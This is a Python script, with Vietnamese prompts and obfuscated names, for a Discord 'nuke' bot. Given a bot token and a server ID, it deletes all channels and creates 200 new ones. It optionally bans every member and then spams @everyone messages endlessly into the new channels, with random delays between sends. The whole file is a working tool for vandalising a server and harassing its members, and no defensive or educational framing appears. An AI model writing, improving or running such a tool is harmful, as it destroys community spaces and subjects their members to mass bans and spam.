import discord
import asyncio
import threading
import random
import sys

class a:
    def __init__(self):
        self.b = discord.Client(intents=discord.Intents.all())
        self.c = None
        self.e = []

        @self.b.event
        async def on_ready():
            print(f" Bot đã đăng nhập: {self.b.user}")
            i = input("Nhập ID Server > ")
            self.c = self.b.get_guild(int(i))

            if not self.c:
                print(" Sai ID server hoặc bot chưa vào server đó")
                await self.b.close()
                return

            perms = self.c.me.guild_permissions
            thiếu = []
            if not perms.kick_members: thiếu.append("Kick")
            if not perms.ban_members: thiếu.append("Ban")
            if not perms.manage_channels: thiếu.append("Quản lý kênh")

            if thiếu:
                print(f" Bot thiếu quyền: {', '.join(thiếu)}")
                await self.b.close()
                return

            await self.l()

    async def l(self):
        tasks = [self.delete_channel(ch) for ch in self.c.channels]
        await asyncio.gather(*tasks)

        name = input("Nhập tên kênh sẽ tạo > ")
        ban_all = input("Bạn có muốn ban toàn bộ member? (Y/N) ").lower()

        create_text = [self.create_channel(name, False) for _ in range(100)]
        create_voice = [self.create_channel(name, True) for _ in range(100)]
        await asyncio.gather(*create_text, *create_voice)

        if ban_all == 'y':
            ban_tasks = [self.ban_member(m) for m in self.c.members if m != self.c.me]
            await asyncio.gather(*ban_tasks)

        await self.start_mass_spam()

    async def delete_channel(self, ch):
        try:
            await ch.delete()
            await asyncio.sleep(random.uniform(0, 1))
        except:
            pass

    async def create_channel(self, name, is_voice):
        try:
            if is_voice:
                await self.c.create_voice_channel(name)
            else:
                ch = await self.c.create_text_channel(name)
                self.e.append(ch)
        except:
            pass

    async def ban_member(self, member):
        try:
            await member.ban(reason="Banned by tool")
            print(f" Đã ban {member.name}")
        except:
            pass

    async def start_mass_spam(self):
        try:
            with open('content.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
        except:
            lines = ["Nguyen Dang Khoi Trùm X Hot Boi Sàn Treo Cute=))) @everyone @here\n"]

        print(f" Bắt đầu spam vô hạn vào {len(self.e)} kênh...")
        tasks = []
        for ch in self.e:
            tasks.append(asyncio.create_task(self.spam_forever(ch, lines)))
        await asyncio.gather(*tasks)

    async def spam_forever(self, ch, lines):
        while True:
            try:
                msg = random.choice(lines).strip()
                await ch.send(msg)
                await asyncio.sleep(random.uniform(0.1, 0.4))  # delay nhẹ giữa mỗi lần gửi
            except Exception:
                await asyncio.sleep(1)

    def mm(self):
        asyncio.run(self.g())

    async def g(self):
        token = input("Nhập Token bot > ")
        try:
            await self.b.start(token)
        except Exception as e:
            print(f" Lỗi token hoặc không kết nối được: {e}")
            sys.exit()

if __name__ == "__main__":
    tool = a()
    thread = threading.Thread(target=tool.mm)
    thread.start()
    thread.join()